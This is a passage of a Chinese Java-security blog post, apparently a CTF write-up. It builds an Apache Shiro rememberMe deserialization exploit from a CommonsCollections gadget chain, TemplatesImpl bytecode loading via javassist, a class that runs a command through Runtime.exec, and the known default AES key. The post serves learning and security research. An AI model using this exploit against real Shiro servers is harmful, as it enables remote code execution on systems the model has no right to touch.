+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javassist.ClassPool</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javassist.CtClass</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.Transformer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.keyvalue.TiedMapEntry</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.shiro.crypto.AesCipherService</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.shiro.util.ByteSource</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.io.ByteArrayOutputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Base64</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">attack2</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">setFieldValue</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">,</span> <span class="n">String</span> <span class="n">fieldName</span><span class="o">,</span> <span class="n">Object</span> <span class="n">value</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="n">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">fieldName</span><span class="o">);</span>
+        <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">field</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="n">value</span><span class="o">);</span>
+    <span class="o">}</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="n">ClassPool</span> <span class="n">pool</span> <span class="o">=</span> <span class="n">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">();</span>
+        <span class="n">CtClass</span> <span class="n">clazzz</span> <span class="o">=</span> <span class="n">pool</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">&#34;EvilTest&#34;</span><span class="o">);</span>
+        <span class="kt">byte</span><span class="o">[]</span> <span class="n">code</span> <span class="o">=</span> <span class="n">clazzz</span><span class="o">.</span><span class="na">toBytecode</span><span class="o">();</span>
+        <span class="n">TemplatesImpl</span> <span class="n">obj</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TemplatesImpl</span><span class="o">();</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">&#34;_bytecodes&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[][]{</span><span class="n">code</span><span class="o">});</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">&#34;_name&#34;</span><span class="o">,</span> <span class="s">&#34;HelloTemplatesImpl&#34;</span><span class="o">);</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">&#34;_tfactory&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">TransformerFactoryImpl</span><span class="o">());</span>
+        <span class="c1">// faketransformer防止构造时触发
+</span><span class="c1"></span>        <span class="n">Transformer</span> <span class="n">faketransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&#34;getClass&#34;</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
+        <span class="c1">// CC6pro
+</span><span class="c1"></span>        <span class="n">Map</span> <span class="n">innerMap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
+        <span class="n">Map</span> <span class="n">outerMap</span> <span class="o">=</span> <span class="n">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">innerMap</span><span class="o">,</span> <span class="n">faketransformer</span><span class="o">);</span>
+        <span class="c1">// key传入恶意TemplatesImpl对象
+</span><span class="c1"></span>        <span class="n">TiedMapEntry</span> <span class="n">tme</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TiedMapEntry</span><span class="o">(</span><span class="n">outerMap</span><span class="o">,</span><span class="n">obj</span><span class="o">);</span>
+        <span class="n">HashMap</span> <span class="n">expMap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
+        <span class="n">expMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">tme</span><span class="o">,</span><span class="s">&#34;value&#34;</span><span class="o">);</span>
+        <span class="n">outerMap</span><span class="o">.</span><span class="na">clear</span><span class="o">();</span>
+        <span class="c1">//将faketransformer改造，iMethodName换成newTransformer触发链子
+</span><span class="c1"></span>        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">faketransformer</span><span class="o">,</span> <span class="s">&#34;iMethodName&#34;</span><span class="o">,</span> <span class="s">&#34;newTransformer&#34;</span><span class="o">);</span>
+
+        <span class="c1">// 生成序列化字符串
+</span><span class="c1"></span>        <span class="n">ByteArrayOutputStream</span> <span class="n">barr</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
+        <span class="n">ObjectOutputStream</span> <span class="n">oos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="n">barr</span><span class="o">);</span>
+        <span class="n">oos</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">expMap</span><span class="o">);</span>
+        <span class="n">oos</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+
+        <span class="c1">// shiro数据生成
+</span><span class="c1"></span>        <span class="n">AesCipherService</span> <span class="n">aes</span> <span class="o">=</span> <span class="k">new</span> <span class="n">AesCipherService</span><span class="o">();</span>
+        <span class="kt">byte</span><span class="o">[]</span> <span class="n">key</span> <span class="o">=</span> <span class="n">Base64</span><span class="o">.</span><span class="na">getDecoder</span><span class="o">().</span><span class="na">decode</span><span class="o">(</span><span class="s">&#34;kPH+bIxk5D2deZiIxcaaaA==&#34;</span><span class="o">);</span>
+        <span class="n">ByteSource</span> <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">aes</span><span class="o">.</span><span class="na">encrypt</span><span class="o">(</span><span class="n">barr</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">(),</span> <span class="n">key</span><span class="o">);</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">printf</span><span class="o">(</span><span class="n">ciphertext</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+
+
+</code></pre></td></tr></table>
+</div>
+</div><p>最后我们再写个类去生成字节码去给TemplatesImpl加载</p>
+<p>这里用到了<code>javassist</code>，这是一个字节码操纵的第三方库，可以帮助我将恶意类生成字节码再交给 TemplatesImpl</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">ClassPool pool = ClassPool.getDefault();
+CtClass clazzz = pool.get(&#34;EvilTest&#34;);
+byte[] code = clazzz.toBytecode();
+</code></pre></td></tr></table>
+</div>
+</div><p>然后再写一个恶意类，因为是要放入TemplatesImpl加载，所以得继承AbstractTranslet</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.DOM</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.TransletException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xml.internal.dtm.DTMAxisIterator</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xml.internal.serializer.SerializationHandler</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">EvilTest</span> <span class="kd">extends</span> <span class="n">AbstractTranslet</span> <span class="o">{</span>
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">transform</span><span class="o">(</span><span class="n">DOM</span> <span class="n">document</span><span class="o">,</span> <span class="n">SerializationHandler</span><span class="o">[]</span> <span class="n">handlers</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">TransletException</span> <span class="o">{</span>
+
+    <span class="o">}</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">transform</span><span class="o">(</span><span class="n">DOM</span> <span class="n">document</span><span class="o">,</span> <span class="n">DTMAxisIterator</span> <span class="n">iterator</span><span class="o">,</span> <span class="n">SerializationHandler</span> <span class="n">handler</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">TransletException</span> <span class="o">{</span>
+
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="nf">EvilTest</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
+        <span class="kd">super</span><span class="o">();</span>
+        <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#34;</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+
+</code></pre></td></tr></table>
+</div>
+</div><p>然后运行拿到rememberMe，换上去刷新页面拿到flag**（要把JSESSIONID删掉！！！）**</p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20221004193008262.png" title="image-20221004193008262" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20221004193008262.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20221004193008262.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20221004193008262.png, https://tuchuang.huamang.xyz/img/image-20221004193008262.png 1.5x, https://tuchuang.huamang.xyz/img/image-20221004193008262.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20221004193008262.png">
+    </a></p>
+<h1 id="总结" class="headerLink">
+    <a href="#%e6%80%bb%e7%bb%93" class="header-mark"></a>总结</h1><p>其实也没啥好说的，就是Shiro的key泄露造成的序列化数据的伪造，个人觉得Shiro太自负了，出现这种隐患不是去修改机制而还是从key的角度去防护，这让Shiro无论哪个版本，只要key泄露了，都会出现反序列化漏洞</p>
+<p>然后值得一说的是，Shiro他因为不允许反序列化数组的原因，误打误撞的防御了ysoserial的CC链POC，关于这个的原因，详情可以参考这篇<a href="https://blog.zsxsoft.com/post/35" target="_blank" rel="noopener noreferrer">博客</a></p>
+<p>最后我这次构造的POC其实挺曲折的，因为前面抱着侥幸的心里漏学了一些知识，导致都在这里还债了</p>
+<p>最后总结一下shiro的CC利用链的构建思路</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">javassist生成恶意字节码 -&gt; TemplatesImpl -&gt; obj
+
+构建faketransformer = new InvokerTransformer(&#34;getClass&#34;, null, null)
+
+faketransformer -&gt;  LazyMap.decorate() -&gt; outMap
+
+TiedMapEntry(outMap,obj) -&gt; tme : 等待触发newTransformer
+
+新建HashMap —&gt; tmp -&gt; expMap.put(tme,xxx) : 等待触发get进入CC6链子
+
+把newTransformer插入iMethodName -&gt; setFieldValue : faketransformer转为可用transformer，触发transform可调用newTransformer
+</code></pre></td></tr></table>
+</div>
+</div></div>
+
+        <div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2022-10-03</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/cc3/" class="prev" rel="prev" title="[Java安全] CommonsCollections3链分析"><i class="fas fa-angle-left fa-fw"></i>[Java安全] CommonsCollections3链分析</a></div>
+</div>
+</article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">2022</div><div class="footer-line"><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer">Huamang</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
+                    <span class="icp"><a href="https://beian.miit.gov.cn/" target="_blank">赣ICP备2021001334号</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.0/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.11.0/dist/algoliasearch.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/topbar@1.0.1/topbar.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@sliphua/pjax@2.4.0/dist/pjax.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script></div>
+
+<div class="pjax-assets"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.zh-cn","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js"></script></div>
+</body>
+
+</html>
